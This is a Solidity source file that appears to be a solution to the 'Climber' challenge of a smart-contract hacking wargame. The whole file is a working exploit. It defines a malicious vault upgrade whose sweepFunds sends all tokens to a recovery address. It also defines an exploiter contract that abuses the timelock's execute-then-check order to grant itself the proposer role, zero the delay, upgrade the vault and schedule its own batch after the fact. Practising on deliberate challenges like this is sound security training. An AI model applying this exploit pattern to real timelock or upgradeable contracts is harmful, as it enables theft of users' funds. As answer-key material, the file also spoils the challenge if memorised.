// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/IAccessControl.sol";

contract ClimberVaultV2 is ClimberVault {
    address public immutable recoveryAddress;

    constructor(address _recoveryAddress) {
        recoveryAddress = _recoveryAddress;
    }

    function sweepFunds(address token) external override {
        SafeTransferLib.safeTransfer(token, recoveryAddress, IERC20(token).balanceOf(address(this)));
    }
}

contract ClimberExploiter {
    ClimberTimelock public immutable timelock;
    ClimberVault public immutable vault;
    address public immutable player;
    address public immutable recovery;
    bytes32 public constant SALT = bytes32(uint256(1));
    ClimberVaultV2 public vaultV2;

    // Store operation data to ensure it's the same in both exploit and schedule
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    constructor(address _timelock, address _vault, address _recovery) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        player = msg.sender;
        recovery = _recovery;
    }

    function exploit() external {
        require(msg.sender == player, "!player");
        
        // Deploy VaultV2 first so we have the same address in both functions
        vaultV2 = new ClimberVaultV2(recovery);
        
        // Create arrays for operations
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        // First operation: Grant PROPOSER_ROLE to this contract using timelock's ADMIN_ROLE
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(
            IAccessControl.grantRole,
            (PROPOSER_ROLE, address(this))
        );

        // Second operation: Update delay to 0
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(ClimberTimelock.updateDelay, (0));

        // Third operation: Upgrade vault to V2
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeToAndCall.selector,
            address(vaultV2),
            ""
        );

        // Fourth operation: Schedule these operations
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(
            ClimberExploiter.schedule,
            (targets, values, dataElements)
        );

        // Execute operations - this will execute in order:
        // 1. Update delay to 0 (using timelock as caller)
        // 2. Grant PROPOSER_ROLE to this contract (using timelock's ADMIN_ROLE)
        // 3. Upgrade vault to V2
        // 4. Schedule these operations (which will make them ready for execution)
        timelock.execute(targets, values, dataElements, SALT);
    }

    function schedule(
        address[] calldata,
        uint256[] calldata,
        bytes[] calldata
    ) external {
        require(msg.sender == address(timelock), "!timelock");
        // Schedule the operations that are currently being executed
        // This will make them ready for execution when the final check happens
        // We use the same operation data that was set in the exploit function
        timelock.schedule(targets, values, dataElements, SALT);
    }
}
